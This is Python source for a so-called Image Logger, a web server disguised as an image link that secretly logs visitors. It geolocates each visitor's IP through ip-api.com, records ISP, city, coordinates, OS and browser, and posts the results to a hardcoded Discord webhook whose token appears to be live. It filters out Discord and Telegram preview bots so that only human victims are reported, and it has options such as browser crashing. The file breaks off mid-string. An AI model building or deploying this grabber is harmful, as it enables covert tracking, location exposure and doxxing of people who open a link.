from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback
import requests
import base64
import json

config = {
    "webhook": "https://discord.com/api/webhooks/1502820207755001886/qQRUzmfJZYFlgjflOpAhwsjBZyYMSkuHF_JymRDNOMAxK3Gm1wJ5FbGSYwkbXijXhnPV",
    "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent) if ip else False
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"Link sent\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }]
            })
        return

    ping = "@everyone"
    
    try:
        info = requests.get(f"http://ip-api.com/json/{ip if ip else '8.8.8.8'}?fields=16976857", timeout=5).json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown", "country": "Unknown", 
                "regionName": "Unknown", "city": "Unknown", "lat": 0, "lon": 0, "timezone": "Unknown/Unknown", 
                "mobile": False}
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name = "Unknown"
    browser_name = "Unknown"
    
    if useragent:
        ua_lower = useragent.lower()
        if "windows" in ua_lower:
            os_name = "Windows"
        elif "linux" in ua_lower:
            os_name = "Linux"
        elif "mac" in ua_lower:
            os_name = "macOS"
        elif "android" in ua_lower:
            os_name = "Android"
        elif "ios" in ua_lower or "iphone" in ua_lower:
            os_name = "iOS"
        
        if "chrome" in ua_lower and "edg" not in ua_lower:
            browser_name = "Chrome"
        elif "firefox" in ua_lower:
            browser_name = "Firefox"
        elif "safari" in ua_lower and "chrome" not in ua_lower:
            browser_name = "Safari"
        elif "edg" in ua_lower:
            browser_name = "Edge"
        elif "opera" in ua_lower:
            browser_name = "Opera"
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**User opened image**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', 0)}, {info.get('lon', 0)}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False)}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser_name}`

**User Agent:**
